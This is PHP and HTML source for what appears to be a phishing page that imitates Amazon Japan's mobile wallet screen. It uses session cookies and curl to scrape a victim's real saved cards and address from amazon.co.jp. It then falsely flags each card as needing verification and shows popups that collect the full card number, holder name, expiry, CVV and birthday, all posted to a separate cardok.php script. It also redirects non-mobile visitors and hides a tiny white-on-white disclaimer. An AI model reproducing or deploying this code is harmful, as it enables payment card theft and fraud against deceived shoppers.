<?php

include './php/xzpc.php';
session_start();
$cookieSuccess = $_SESSION["cookiesuccess"]?$_SESSION["cookiesuccess"]:"./cookies/".md5(time().rand(10000,99999)).".cookie";
$_SESSION["cookiesuccess"] = $cookieSuccess;
include './php/curl.php';
if(!is_mobile_request()){
    header("location: /wallet.php");
    exit;
}
//$_SESSION["cardinfo"]
if($_SESSION["cardinfo"]){
    $cardInfo = $_SESSION["cardinfo"]["cardlist"];
}else{
    
   
    $url = "https://www.amazon.co.jp/cpe/yourpayments/wallet";
    
    
    $result = get_curl($cookieSuccess,$url,false);
 
    
    $isLogin = strpos($result,'paymentsHubHeaderSection');
    
    if($isLogin){
        preg_match_all("/nav-line-1 nav-progressive-content\">(.*?)</i", $result, $userName);
        preg_match_all("/attribute nav-progressive-content\">(.*?)</i", $result, $cartNum);
        
        preg_match_all("/<\/h5><\/div><\/div><\/div><div class=\"a-row a-spacing-top-mini a-ws-row\">(.*?)<div class=\"a-section a-spacing-small pmts-balance-list\">/i", $result, $cardHtml);
        //echo htmlspecialchars($cardHtml[1][0]);
         preg_match_all("/<div class=\"a-fixed-left-grid pmts-instrument-detail-rows\">(.*?)<div class=\"a-column a-span4 a-text-right a-span-last\">/i", $cardHtml[1][0], $cardHtml);
        
        //print_r($cardHtml);
        
        $cardInfo = array();
        foreach ($cardHtml[1] as $k => $v){
            //$cardList[$k]
            
            preg_match_all("/<span class=\"a-size-base pmts-instrument-display-name\">(.*?)<\/span>/i", $v, $cardType);
            preg_match_all("/<img alt=\"".$cardType[1][0]."\" src=\"(.*?)\"/i", $v, $cardTypeImg);
            
            preg_match_all("/<span class=\"a-letter-space\"><\/span><span>(.*?)<\/span>/i", $v, $cardNum);
            preg_match_all("/<span class=\"a-size-base a-color-secondary\">(.*?)<\/span>/i", $v, $cardDate);
            preg_match_all("/人<\/span><br>(.*?)<\/div>/i", $v, $cardName);
            preg_match_all("/<span class=\"a-size-small pmts-address-field a-text-bold\">(.*?)<\/span>/i", $v, $HomeName);
            preg_match_all("/<span class=\"a-size-small pmts-address-field\">(.*?)<\/span>/i", $v, $HomeInfo);
        
            
            
            //print_r($cartNum);
            
            $cardInfo[]=array(
                'cardType'=>$cardType[1][0],
                'cardTypeImg'=>$cardTypeImg[1][0],
                'cardNum'=>$cardNum[1][0],
                'cardDate'=>$cardDate[1][0],
                'cardName'=>$cardName[1][0],
                'homeName'=>$HomeName[1][0],
                'homeInfo'=>$HomeInfo[1],
                'cardok'=>false
            );
        }
        
        $_SESSION["cardinfo"] = array(
            "cardlist" => $cardInfo,
            "username" => $userName[1][0],
            "cartnum" => $cartNum[1][0]
        );
        
    }else {
        header("location: /");
    }
}
?>

<html lang="ja-jp" class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.2-2021-03-12">
 <!-- sp:feature:head-start -->
 <head> 
  <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />
  <meta charset="utf-8" /> 
  <!-- sp:feature:cs-optimization --> 
  <meta http-equiv="x-dns-prefetch-control" content="on" /> 
  <!-- sp:feature:cookie-consent-assets --> 
  <!-- sp:feature:nav-inline-css --> 
  <!-- NAVYAAN CSS --> 
  <style type="text/css">
.nav-sprite-v3 .nav-sprite {
  background-image: url(https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/new-nav-sprite-global-1x_blueheaven-fluid._CB403808729_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(https://images-fe.ssl-images-amazon.com/images/G/09/javascripts/lib/popover/images/snake._CB485935615_.gif);
}
body{
    overflow-x: hidden;
}
.pmts-loading-async-widget-spinner-viewport-centered {
    border: 1px solid #ddd;
    border-radius: 4px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    position: fixed;
    top: 50%;
    left: 50%;
    margin: -50px;
}
.pmts-loading-async-spinner-small {
    height: 80px;
}
.pmts-loading-async-widget-spinner-overlay {
    position: absolute;
    background-color: rgba(255,255,255,.5);
    text-align: center;
    z-index: 9999;
    width: 100%;
    height: 100%;
}
</style> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/314xMGKl-SL._RC|41icwgAxVqL.css,51IXtjMEFNL.css_.css?AUIClients/NavMobileAssets-all" /> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/41C6LaLLmFL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets" /> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets&amp;uEMxjH7Q#mobile" /> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/31vlU7WaBWL.css?AUIClients/RetailSearchAutocompleteAssets&amp;uEMxjH7Q#mobile" /> 
  <link rel="stylesheet" href="../src/style.css?asdsad" /> 
  <!-- sp:feature:host-assets --> 
  <!-- 2mdn4b4cm --> 
  <title> お客様の支払い方法 </title> 
  <link rel="stylesheet" href="https://www.amazon.co.jp/cpe/resources/css/style.css" /> 
 </head>
 <body>
     <div style="position: absolute;color: #fff;font-size:5px;">
     このサービスは、".$_SERVER["HTTP_HOST"]." の代理として amazon.co.jp が提供しています。
    <a href="https://www.amazon.co.jp" style="color: #fff;">詳細</a>
 </div>
  <header id="nav-main" data-nav-language="ja_JP" class="nav-mobile nav-progressive-attribute nav-locale-jp nav-lang-ja nav-ssl nav-rec nav-blueheaven"> 
   <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-standard nav-sprite-v3 celwidget" data-csa-c-id="qlkfp4-ld9u2t-rtusx8-clidxm" data-cel-widget="Navigation-mobile-navbar"> 
    <div id="nav-logobar"> 
     <div class="nav-left"> 
      <div id="nav-logo"> 
       <a href="/ref=navm_hdr_logo" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon"> <span class="nav-sprite nav-logo-base"></span> <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span> <span class="nav-logo-locale">.co.jp</span> </a> 
      </div> 
     </div> 
     <div class="nav-right"> 
      <a href="https://www.amazon.co.jp/gp/aw/c?ref_=navm_hdr_cart" aria-label="Cart" class="nav-a" id="nav-button-cart"> 
       <div id="cart-size" class="nav-cart-0 nav-progressive-attribute"> 
        <span class="nav-icon nav-sprite"> <span id="nav-cart-count" class="nav-cart-count nav-progressive-content"><?=$_SESSION["cardinfo"]["cartnum"]?></span> </span> 
       </div> </a> 
     </div> 
    </div> 
    <div class="nav-progressive-attribute" id="search-ac-init-data" data-ime="1" data-mkt="6" data-src="completion.amazon.co.jp/search/complete"> 
    </div> 
    <div id="nav-search-keywords-data" class="nav-progressive-attribute" data-implicit-alias="aps"> 
    </div> 
    <div class="nav-searchbar-wrapper" style="height:60px;"> 
     <form class="nav-searchbar search-big" action="https://www.amazon.co.jp/gp/aw/s/ref=nb_sb_noss" method="get" role="search" id="nav-search-form" accept-charset="utf-8" style="height:60px;"> 
      <div class="nav-fill"> 
       <div class="nav-search-field"> 
        <input type="text" class="nav-input nav-progressive-attribute" placeholder="検索 Amazon.co.jp" data-aria-clear-label="検索キーワードをクリア" name="k" autocomplete="off" autocorrect="off" autocapitalize="off" dir="auto" value="" id="nav-search-keywords" /> 
        <a class="nav-icon nav-sprite nav-search-clear" tabindex="0" href="javascript:;" aria-label="検索キーワードをクリア"></a>
       </div> 
      </div> 
      <div class="nav-right"> 
       <div class="nav-search-submit"> 
        <input type="submit" class="nav-input" value="搜索" aria-label="搜索" /> 
        <i class="nav-icon nav-sprite"></i> 
       </div> 
      </div> 
     </form> 
    </div> 
    <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA--> 
    <!-- NAVYAAN-GLOW-SUBNAV --> 
   </div> 
   <div id="nav-progressive-subnav"> 
   </div> 
  </header> 
  <!-- sp:feature:host-atf --> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/01jnjrNcUWL.css?AUIClients/CVFAssets#mobile" /> 
  <div id="paymentsHubMobileWebsiteContainer" class="a-container">
   <div class="a-row paymentsHubRowMobile">
    <div id="subheader-YA-breadcrumb" data-testid="cpe-yourAccount-header" class="a-subheader">
     <a href=""><i class="a-icon a-icon-page-back a-subheader-back"></i><h4>アカウントサービス</h4></a>
    </div>
   </div>
   <div id="paymentsHubHeaderSection" class="a-section a-spacing-top-medium">
    <div class="a-row paymentsHubRowMobile">
     <h1>お客様の支払い方法</h1>
    </div>
   </div>
   <div id="paymentsHubMenuRowMobile" class="a-row a-spacing-top-medium"> 
    <div data-a-carousel-options="{}" data-a-transition-strategy="none" data-a-ajax-strategy="none" data-a-class="mobile" class="a-begin a-carousel-container a-carousel-display-stretchyGoodness a-carousel-transition-none a-carousel-initialized">
     <input autocomplete="on" type="hidden" class="a-carousel-firstvisibleitem" /> 
     <div class="a-carousel-viewport" id="anonCarousel1" style="height: 27px;">
      <ol class="a-carousel" role="list" style="width: 383px;">
       <li class="a-carousel-card menuTabSelectedMobile menuTabHeadMobile" role="listitem" aria-setsize="4" aria-posinset="2" aria-hidden="false" style="margin-left: 15px; width: 60px;"> <span class="menuTextSelectedMobile"> お支払い方法 </span> </li>
      </ol>
     </div> 
     <span class="a-end aok-hidden"></span>
    </div> 
   </div>
   <div id="paymentsHubContentSection" class="a-section"> 
    <div class="a-container paymentsHubTabContentMobileContainer"> 
     <div id="portalWidgetSection" class="a-section"> 
      <div id="cpefront-mpo-widget"> 
       <div data-pmts-component-id="pp-2qEIt1-1" class="a-section a-spacing-none pmts-widget-section pmts-portal-root-4wQ6r06485xN pmts-portal-component pmts-portal-components-pp-2qEIt1-1" style="position: relative;">
           
        <div id="boday_loding" data-pmts-component-id="pp-ylIo1c-2" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-ylIo1c-2" style="display:none">
            <img alt="" src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered pmts-loading-async-spinner-small">
        </div>
        
         <input type="hidden" name="ppw-widgetState" value="" />
         <input type="hidden" name="ie" value="UTF-8" />
         <div id="pp-2qEIt1-35" class="a-section a-spacing-none pmts-instrument-list">
          <h2 class="a-spacing-base">Amazonウォレット</h2>
          
          <?php
            foreach ($cardInfo as $k=>$v){
          ?>
          
          <div class="a-section a-spacing-none" style="margin-bottom:5px;">
           <div class="a-row a-ws-row">
            <div data-pmts-component-id="pp-2qEIt1-32" class="a-box pmts-portal-component pmts-portal-components-pp-2qEIt1-32" <?php if(!$v["cardok"]){ ?>style="border-color:#c40000;"<?php } ?>>
             <div class="a-box-inner a-padding-mini">
              <div class="a-row a-spacing-top-base">
               <div class="a-section pmts-instrument-detail-rows">
                <div class="a-fixed-left-grid pmts-account-tail">
                 <div class="a-fixed-left-grid-inner" style="padding-left:1rem">
                  <div class="a-row">
                   <span class="a-size-base pmts-instrument-display-name a-text-bold"><?=$v['cardType']?></span>
                   <span class="a-size-base pmts-instrument-number-tail a-text-bold">
                       <span class="a-letter-space"></span>
                       <span id="cardNum_<?=$k?>"><?=$v['cardNum']?></span>
                    </span>
                  </div>
                 </div>
                </div>
                <div class="a-fixed-left-grid pmts-account-holder-name">
                 <div class="a-fixed-left-grid-inner" style="padding-left:1rem" id="cardName_<?=$k?>"><?=$v['cardName']?></div>
                </div>
                <div class="a-fixed-left-grid pmts-expiration-date-row">
                 <div class="a-fixed-left-grid-inner" style="padding-left:1rem">
                  <div class="a-section pmts-account-expiry-date">
                   <span class="a-size-base a-color-secondary">有効期限は<?=$v['cardDate']?>です</span>
                  </div>
                 </div>
                </div>
                <div class="a-fixed-left-grid pmts-instrument-detail-row">
                 <div class="a-fixed-left-grid-inner" style="padding-left:1rem">
                     <?php 
                        $homeIno = $v['homeName'];
                        foreach($v['homeInfo'] as $k1=>$v1){
                            $homeIno = $homeIno."|&|".$v1;
                        }
                     ?>
                     <input type="hidden" id="cardDate_<?=$k?>" value="<?=$v['cardDate']?>">
                     <input type="hidden" id="homeInfo_<?=$k?>" value="<?=$homeIno?>">
                 </div>
                </div>
               </div>
               <div class="a-fixed-left-grid">
                <div class="a-fixed-left-grid-inner" style="padding-left:1rem"></div>
               </div>
              </div>
              <div class="a-section">
               <div class="a-fixed-left-grid a-spacing-base a-spacing-top-base">
                <div class="a-fixed-left-grid-inner" style="padding-left:1rem">
                 <div class="a-fixed-right-grid">
                  <div class="a-fixed-right-grid-inner" style="padding-right:1rem">
                   <div class="a-row"></div>
                   <div class="a-row">
                       <?php if(!$v["cardok"]){ ?>
                    <div class="a-column a-span1">
                        <i class="a-icon a-icon-alert" style="height: 27px;width: 30px;background-position: -248px -35px;"></i>
                    </div>
                    <div class="a-column a-span5" style="margin-top:-5px;color:#c40000">
                        この支払い方法は検証が必要です。
                    </div>
                    
                    <div class="a-column a-span6 a-span-last">
                     <span class="a-button a-button-base a-button-small pmts-button-input">
                         <span class="a-button-inner" onclick="open_yz_popup(<?=$k?>);">
                            <input class="a-button-input" type="button" />
                            <span class="a-button-text" aria-hidden="true">検証を開始</span>
                        </span>
                    </span>
                    </div>
                    <?php } ?>
                   </div>
                   
                  </div>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
          <?php  }  ?>
           
         </div>
        <div id="pp-2qEIt1-36" class="a-section a-spacing-base pmts-add-payment-instrument">
         <a id="pp-2qEIt1-37" href="javascript:open_bk_popup();" class="a-touch-link a-box a-last pmts-mpo-add-payment-method-trigger-mobile apx-secure-registration-content-trigger-js">
          <div class="a-box-inner">
           <i class="a-icon a-icon-touch-link"></i>
           <span class="a-text-bold">お支払い方法を追加</span>
          </div></a>
        </div>
       </div> 
      </div> 
     </div> 
    </div>
   </div>
  </div> 
  
  <!-----遮罩弹窗----->
  <style>
    .zhezhao
    {
        width:100%;
        height:100%;
        background-color:#000;
        filter:alpha(opacity=80);
        -moz-opacity:0.8;
        opacity:0.8;
        position: fixed;
        left:0px;
        top:0px;
        z-index:299;
        overflow-y: hidden;
        overflow-x: hidden;
    }
</style>
<div class="zhezhao" id="zhezhao" style="display:none;"></div>

<!-----验证弹窗----->
<style>
    .a-popover-wrapper-dy {
        position: fixed;
        border: 1px solid #cdcdcd;
        border-color: rgba(0,0,0,.2);
        border-radius: 4px;
        box-shadow: 0 2px 4px rgb(0 0 0 / 13%);
        background-color: #fff;
        top:50%;
        left:50%;
        transform: translate(-50%,-50%);
        width:95%;
        z-index: 299;
    }
    .a-popover-birthday {
        position: fixed;
        border: 1px solid #cdcdcd;
        border-color: rgba(0,0,0,.2);
        border-radius: 4px;
        box-shadow: 0 2px 4px rgb(0 0 0 / 13%);
        background-color: #fff;
        top:50%;
        left:50%;
        transform: translate(-50%,-50%);
        width:95%;
        z-index: 299;
    }
     .pmts-widget-section {
        position: relative;
    }
</style>
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-yz" style="display:none;">
   <header class="a-popover-header">
    <h4 class="a-popover-header-content" id="a-popover-header-4">お支払い方法を検証</h4>
    <button onclick="close_yz_popup();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
   </header>
   <div class="a-popover-inner" id="a-popover-content-4" style="height: auto; overflow-y: auto;">
    <div class="a-section a-spacing-none pmts-widget-section">
     <div id="yz_loding" data-pmts-component-id="yz_loding" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-FbZGDs-27" style="display:none;">
      <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered">
     </div>
     <form id="yz_form" target="3d-secure" method="post" action="../cardok.php" class="a-spacing-none">
         
         
    <div id="yz_errBox" class="a-row a-spacing-base" style="display:none">
            <div class="a-column a-span12">
                <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                    <div class="a-box-inner a-alert-container">
                        <h4 class="a-alert-heading">問題が発生しました。</h4>
                            <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="yz_errMsg"></ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>         
         
         
        
      <div class="a-section" style="margin-bottom:0;">
       <div class="a-row a-spacing-base pmts-form-fields">
           <input type="hidden" id="yz_cardid" name="cardid">
           <input type="hidden" name="birthday" id="yz_birthday">
        <div class="a-row a-spacing-small">
            <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label">
                <label for="pp-v3SKiV-14" class="a-form-label">カード番号</label>
            </div>
            <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                <input type="tel" placeholder="" autocomplete="off" name="cardnum" id="yz_cardnum" oninput="changecardnum('yz')" class="a-input-text a-form-normal" style="width:100%">
            </div>
        </div>
        <div class="a-row a-spacing-small">
            <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                <label for="pp-v3SKiV-16" class="a-form-label">クレジットカード名義人</label>
            </div>
            <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                <input type="text" maxlength="50" placeholder="クレジットカード名義人" autocomplete="off" name="cardname" id="yz_cardname" class="a-input-text a-form-normal" style="width:100%">
            </div>
        </div>
        <div class="a-row a-spacing-small">
                  <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-credit-card-expiration-date-label">
                   <label for="pp-v3SKiV-17" id="pp-v3SKiV-18" class="a-form-label">有効期限：</label>
                  </div>
                  <div class="a-column a-span8 pmts-credit-card-expiration-date-input-box a-span-last">
                   <div id="add-credit-card-expiry-date-input-id" class="a-row">
                    <div class="a-column a-span6">
                        <select name="carddatem" id="yz_carddatem" autocomplete="off" tabindex="0" class="a-input-text a-form-normal" value="1" style="width:98%">
                            <option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                        </select>
                    </div>
                    <div class="a-column a-span6 a-span-last">
                        <select name="carddatey" id="yz_carddatey" autocomplete="off" tabindex="0" class="a-input-text a-form-normal" value="1" style="width:98%">
                            <option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option><option value="2041">2041</option>
                        </select>
                    </div>
                   </div>
                  </div>
                 </div>
        <div class="a-row a-spacing-small">
            <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-update-everywhere-or-set-buying-preference-label">
                <label for="pp-v3SKiV-17" id="pp-v3SKiV-18" class="a-form-label">セキュリティコード</label>
            </div>
            <div class="a-column a-span8 pmts-update-everywhere-or-set-buying-preference-input-box a-span-last">
                <input type="text" maxlength="4" placeholder="CVV / CVC" autocomplete="off" name="cardcvv" id="yz_cardcvv" class="a-input-text a-form-normal" style="width:100%">
            </div>
        </div>        
       </div>
       <div class="a-row">
           <input type="hidden" id="yz_homeinfo" name="homeinfo" value="">
       </div>
      </div>
      
       
       <div class="a-row">
       <div class="a-column a-span12 a-text-right pmts-edit-instrument-buttons">
        <span class="a-button a-spacing-top-mini a-button-primary pmts-button-input">
            <span class="a-button-inner" onclick="yzsubmit();">
                <input class="a-button-input" type="button" value="次のステップ">
                <span class="a-button-text" aria-hidden="true">次のステップ</span>
            </span>
        </span>
       </div>
      </div>
      </form></div>
      
     
    </div>
   </div>
<script src="../src/banktype.js" type="application/javascript"></script>
<script>
    var errMsg = new Array();
        errMsg["cardname"]="クレジットカードの名義人が入力されていないか、正しく入力されていません。名義人は、半角英数字でカードに記載されているとおりに入力してください";
        errMsg["cardnum"]="クレジットカード番号が入力されていません。以下の欄にカード番号全けたを入力してください";
        errMsg["cardnum_error"]="クレジットカード番号が正しくありません";
        errMsg["carddate"]="クレジットカードの有効期限をご確認のうえ、入力し直してください"; 
        errMsg["cardcvv"]="クレジットカードのセキュリティコードが入力されていないか、正しく入力されていません。確認後、再入力してください";
    var carnumlength = 0;
    function changecardnum(type){
        var carnum = document.getElementById(type+"_cardnum");
        var CursortPosition = getCursortPosition(carnum);
        carnum.value = (carnum.value.replace(/\s/g, '').replace(/(.{4})/g, "$1 ")).replace(/(\s*$)/g,"");
        if(CursortPosition%5 == 0){
            if(carnum.value.length>carnumlength){
                CursortPosition = CursortPosition+1;
            }else{
                CursortPosition = CursortPosition-1;
            }
        }
        carnumlength = carnum.value.length;
        if(CursortPosition<0){
            CursortPosition=0;
        }
        setCaretPosition(carnum,CursortPosition);
    }
    function checkNumber(theObj) {
        var reg = /^[0-9]+.?[0-9]*$/;
        if (reg.test(theObj)) {
            return true;
        }
        return false;
    }
    
    function getCursortPosition (textDom) {
        var cursorPos = 0;
        if (document.selection) {
            // IE Support
            textDom.focus ();
            var selectRange = document.selection.createRange();
            selectRange.moveStart ('character', -textDom.value.length);
            cursorPos = selectRange.text.length;
        }else if (textDom.selectionStart || textDom.selectionStart == '0') {
            // Firefox support
            cursorPos = textDom.selectionStart;
        }
        return cursorPos;
    }

    // 设置光标位置
    function setCaretPosition(textDom, pos){
        if(textDom.setSelectionRange) {
            // IE Support
            textDom.focus();
            textDom.setSelectionRange(pos, pos);
        }else if (textDom.createTextRange) {
            // Firefox support
            var range = textDom.createTextRange();
            range.collapse(true);
            range.moveEnd('character', pos);
            range.moveStart('character', pos);
            range.select();
        }
    }       
        
    function yzsubmit(){
        removeerror_yz();
        
        var yzerrBox = document.getElementById("yz_errBox");
        var yzerrMsg = document.getElementById("yz_errMsg");
        var yzcardnum = document.getElementById("yz_cardnum");
        var yzcaedname = document.getElementById("yz_cardname");
        var yzcarddatem = document.getElementById("yz_carddatem");
        var yzcarddatey = document.getElementById("yz_carddatey");
        var yzcardcvv = document.getElementById("yz_cardcvv");
        
        var errorHtml = "";
        var inputcardnum = yzcardnum.value.split(" ").join("");
        var cardnum4num = (yzcardnum.placeholder.match(/\d+/g))[0]
        console.log(cardnum4num);
        
        if(yzcaedname.value.trim()==""){
            yzcaedname.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardname']+'</span></li>';
        }
        if(yzcardnum.value == ""){
            yzcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum']+'</span></li>';
        }else if(!luhn_algo(inputcardnum)){
            yzcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum_error']+'</span></li>';
        }else if(inputcardnum.substr(-4)!=cardnum4num){
            yzcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum_error']+'</span></li>';
        }
        if(yzcarddatey.value+(yzcarddatem.value>9?yzcarddatem.value:"0"+yzcarddatem.value) < <?=date("Ym")?>){
            yzcarddatem.classList.add("a-form-error");
            yzcarddatey.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['carddate']+'</span></li>';
        }
        if(yzcardcvv.value<100 || yzcardcvv.value>9999 || !checkNumber(yzcardcvv.value)){
            yzcardcvv.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardcvv']+'</span></li>';
        }
        
        if(errorHtml!=""){
            yzerrMsg.innerHTML = errorHtml;
            yzerrBox.style.display="";
        }else{
            document.getElementById("yz_loding").style.display="";
            setTimeout(function () {
                document.getElementById("yz_loding").style.display="none";
                open_birthday_box("yz");
            }, 600);
        }
            
        
    }
    
    function removeerror_yz(){
        document.getElementById("yz_errBox").style.display="none";
        document.getElementById("yz_cardname").classList.remove("a-form-error");
        document.getElementById("yz_cardnum").classList.remove("a-form-error");
        document.getElementById("yz_cardcvv").classList.remove("a-form-error");
        document.getElementById("yz_carddatem").classList.remove("a-form-error");
        document.getElementById("yz_carddatey").classList.remove("a-form-error");
       
    }
    function open_yz_popup(cardid){
        document.getElementById("boday_loding").style.display="";
        carnumlength = 0;
        setTimeout(function () {
            document.getElementById("boday_loding").style.display="none";
            go_open_yz_popup(cardid);
        }, 600);
    }
    
    function go_open_yz_popup(cardid){
        
        
        var cardnum = document.getElementById("cardNum_"+cardid).innerHTML;
        var cardname = document.getElementById("cardName_"+cardid).innerHTML;
        var carddate = document.getElementById("cardDate_"+cardid).value;
        var homeinfo = document.getElementById("homeInfo_"+cardid).value;
        
        var carddateArray = new Array();
        carddateArray = carddate.split("/");
        var carddatem = carddateArray[0];
        if(carddatem<10){
            carddatem = carddatem.split("0").join("");
        }
        removeerror_yz();
        document.getElementById("yz_cardid").value = cardid;
        document.getElementById("yz_cardnum").placeholder = cardnum;
        document.getElementById("yz_cardnum").value = "";
        document.getElementById("yz_cardname").value = cardname;
        document.getElementById("yz_homeinfo").value = homeinfo;
        document.getElementById("yz_cardcvv").value = "";
    
        document.getElementById("yz_carddatem").value = carddatem;

        document.getElementById("yz_carddatey").value = carddateArray[1];

        
        document.body.style.overflow = "hidden";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-yz").style.display="";
    }
    
    function close_yz_popup(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-yz").style.display="none";
    }
</script>
<!-----绑卡弹窗----->
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-bk" style="display:none;">
   <header class="a-popover-header">
    <h4 class="a-popover-header-content" id="a-popover-header-4">クレジットまたはデビットカードを追加</h4>
    <button onclick="close_bk_popup();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
   </header>
   <div class="a-popover-inner" id="a-popover-content-4" style="height: auto; overflow-y: auto;">
    <div class="a-section a-spacing-none pmts-widget-section">
     <div id="bk_loding" data-pmts-component-id="bk_loding" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-FbZGDs-27" style="display:none;">
      <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered">
     </div>
     <form id="bk_form" target="3d-secure" method="post" action="../cardok.php" class="a-spacing-none">
         
         
    <div id="bk_errBox" class="a-row a-spacing-base" style="display:none">
            <div class="a-column a-span12">
                <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                    <div class="a-box-inner a-alert-container">
                        <h4 class="a-alert-heading">問題が発生しました。</h4>
                            <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="bk_errMsg"></ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>         
         
         
        
      <div class="a-section" style="margin-bottom:0;">
       <div class="a-row a-spacing-base pmts-form-fields">
           <input type="hidden" name="birthday" id="bk_birthday">
        <div class="a-row a-spacing-small">
            <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label">
                <label for="pp-v3SKiV-14" class="a-form-label">カード番号</label>
            </div>
            <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                <input type="tel" placeholder="カード番号" autocomplete="off" name="cardnum" id="bk_cardnum" oninput="changecardnum('bk')" class="a-input-text a-form-normal" style="width:100%">
            </div>
        </div>
        <div class="a-row a-spacing-small">
            <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                <label for="pp-v3SKiV-16" class="a-form-label">クレジットカード名義人</label>
            </div>
            <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                <input type="text" maxlength="50" placeholder="クレジットカード名義人" autocomplete="off" name="cardname" id="bk_cardname" class="a-input-text a-form-normal" style="width:100%">
            </div>
        </div>
        <div class="a-row a-spacing-small">
                  <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-credit-card-expiration-date-label">
                   <label for="pp-v3SKiV-17" id="pp-v3SKiV-18" class="a-form-label">有効期限：</label>
                  </div>
                  <div class="a-column a-span8 pmts-credit-card-expiration-date-input-box a-span-last">
                   <div id="add-credit-card-expiry-date-input-id" class="a-row">
                    <div class="a-column a-span6">
                        <select name="carddatem" id="bk_carddatem" autocomplete="off" tabindex="0" class="a-input-text a-form-normal" value="1" style="width:98%">
                            <option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                        </select>
                    </div>
                    <div class="a-column a-span6 a-span-last">
                        <select name="carddatey" id="bk_carddatey" autocomplete="off" tabindex="0" class="a-input-text a-form-normal" value="2021" style="width:98%">
